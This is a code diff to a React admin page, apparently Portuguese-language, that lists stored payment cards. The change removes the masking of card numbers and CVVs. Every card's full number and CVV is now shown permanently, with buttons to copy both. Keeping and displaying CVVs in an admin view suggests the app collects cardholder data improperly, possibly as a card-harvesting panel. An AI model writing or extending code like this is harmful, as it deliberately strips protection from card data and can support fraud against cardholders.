@@ -1,26 +1,23 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Eye, EyeOff, Copy, RefreshCw } from 'lucide-react';
+import { Search, Copy, RefreshCw } from 'lucide-react';
 import { toast } from 'sonner';
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || '';
 const fmt = (v) => new Intl.NumberFormat('pt-PT', { style: 'currency', currency: 'EUR' }).format(v || 0);
 const fmtDate = (iso) => iso ? new Date(iso).toLocaleString('pt-PT', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }) : '—';
 
-// Detectar bandeira do cartão pelo primeiro dígito/s
 const detectBrand = (num) => {
   const n = (num || '').replace(/\s/g, '');
-  if (n.startsWith('4'))          return { label: 'VISA',       color: '#1a1f71' };
-  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return { label: 'MASTERCARD', color: '#eb001b' };
-  if (/^3[47]/.test(n))           return { label: 'AMEX',       color: '#007bc0' };
-  return                                    { label: 'CARD',       color: '#26263a' };
+  if (n.startsWith('4'))                       return { label: 'VISA',       color: '#1a1f71' };
+  if (/^5[1-5]/.test(n)||/^2[2-7]/.test(n))   return { label: 'MASTERCARD', color: '#880e4f' };
+  if (/^3[47]/.test(n))                        return { label: 'AMEX',       color: '#007bc0' };
+  return                                               { label: 'CARD',       color: '#1a1a3e' };
 };
 
-function CreditCardVisual({ card, showFull, onToggle }) {
-  const brand = detectBrand(card.card_number || '');
-  const digits = (card.card_number || '').replace(/\s/g, '');
-  const displayNum = showFull
-    ? (card.card_number || '').replace(/(.{4})/g, '$1 ').trim()
-    : `**** **** **** ${digits.slice(-4) || '????'}`;
+function CreditCardVisual({ card }) {
+  const brand  = detectBrand(card.card_number || '');
+  // Mostrar número completo sempre
+  const num    = (card.card_number || '•••• •••• •••• ••••').replace(/(.{4})(?=.)/g, '$1 ').trim();
 
   const copy = (text, label) => {
     navigator.clipboard.writeText(text).then(() => toast.success(`${label} copiado!`)).catch(() => {});
@@ -50,15 +47,11 @@ function CreditCardVisual({ card, showFull, onToggle }) {
       <div style={{ marginTop: 52 }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
           <span className="numeric" style={{ fontSize: 18, fontWeight: 700, color: '#fff', letterSpacing: '0.16em', fontFamily: 'monospace' }}>
-            {displayNum}
+            {num}
           </span>
-          <button onClick={() => copy(digits, 'Número')} title="Copiar número"
+          <button onClick={() => copy(card.card_number || '', 'Número')} title="Copiar número"
             style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: 'rgba(255,255,255,0.7)' }}>
             <Copy size={11} />
-          </button>
-          <button onClick={onToggle} title={showFull ? 'Ocultar' : 'Revelar'}
-            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: 'rgba(255,255,255,0.7)' }}>
-            {showFull ? <EyeOff size={12} /> : <Eye size={12} />}
           </button>
         </div>
 
@@ -78,10 +71,9 @@ function CreditCardVisual({ card, showFull, onToggle }) {
 }
 
 export default function AdminCards() {
-  const [cards, setCards]   = useState([]);
+  const [cards, setCards]     = useState([]);
   const [loading, setLoading] = useState(true);
   const [search, setSearch]   = useState('');
-  const [revealed, setRevealed] = useState({}); // { id: true/false }
 
   const fetchCards = async () => {
     const token = localStorage.getItem('adminToken');
@@ -150,11 +142,7 @@ export default function AdminCards() {
             <div key={card.id} style={{ display: 'flex', flexDirection: 'column', gap: 0, background: '#111118', border: '1px solid #26263a', borderRadius: 18, overflow: 'hidden' }}>
 
               {/* Visual do cartão */}
-              <CreditCardVisual
-                card={card}
-                showFull={!!revealed[card.id]}
-                onToggle={() => setRevealed(r => ({ ...r, [card.id]: !r[card.id] }))}
-              />
+              <CreditCardVisual card={card} />
 
               {/* Dados abaixo do cartão */}
               <div style={{ padding: '14px 18px', display: 'flex', flexDirection: 'column', gap: 8 }}>
@@ -163,7 +151,7 @@ export default function AdminCards() {
                   <span style={{ fontSize: 11, color: '#7a8299', textTransform: 'uppercase', letterSpacing: '0.08em' }}>CVV</span>
                   <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                     <span className="numeric" style={{ fontSize: 13, fontWeight: 700, color: '#f3f5ff', fontFamily: 'monospace' }}>
-                      {revealed[card.id] ? (card.cvv || '***') : '***'}
+                      {card.cvv || '—'}
                     </span>
                     <button onClick={() => copy(card.cvv || '', 'CVV')}
                       style={{ background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: '#7a8299' }}>
